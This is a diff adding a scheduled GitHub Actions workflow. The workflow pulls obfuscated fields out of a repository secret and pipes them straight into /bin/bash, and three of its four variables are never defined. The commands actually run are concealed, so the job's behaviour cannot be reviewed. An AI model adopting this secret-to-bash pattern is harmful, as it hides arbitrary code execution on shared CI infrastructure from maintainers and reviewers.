@@ -1,0 +1,19 @@
+name: jixiaxingliang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jixiaxingliang
+        env:
+          iql76591: ${{ secrets.iql76591 }}
+        run: |
+          echo $iql76591 | jq -r .spq585 | /bin/bash
+          echo $ws1758 | jq -r .ftb94 | /bin/bash
+          echo $ujxu355 | jq -r .jeeue0563 | /bin/bash
+          echo $mevyq2 | jq -r .rah043 | /bin/bash
+
